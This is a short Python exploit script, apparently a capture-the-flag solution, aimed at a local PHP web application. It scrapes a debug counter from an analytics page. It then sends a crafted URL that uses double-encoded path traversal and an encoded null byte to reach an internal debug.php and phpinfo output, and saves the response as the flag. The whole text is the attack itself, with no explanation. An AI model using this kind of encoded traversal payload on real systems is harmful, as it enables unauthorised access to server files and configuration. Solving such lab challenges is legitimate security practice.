import requests, re

TARGET = 'http://localhost:8000'

if __name__ == '__main__':
    r = requests.get(TARGET + '/%F0%9F%98%8E/analytics/')
    matches = re.search(r'<div class="card-title">debug</div>\s+<div class="metric">(\d+)</div>', r.text, re.S)
    rtd_counter = int(matches.group(1)) // 2 if matches != None else 0
    print("rtd_counter:", rtd_counter)

    payload = TARGET + '/debug/debug%252fvar%252fwww%252fsrc%252fmodules%252fdebug.php:5${rtd_counter:x}/phpinfo/CONFIG_CONFIG_module_namespace/%2500app%255cmodules'
    for _ in range(10):
        r = requests.get(payload.format(rtd_counter=rtd_counter))
        print("status_code:", r.status_code)
        if r.status_code == 200:
            with open('flag-in-the-phpinfo.html', 'wb') as f:
                f.write(r.content)
            break
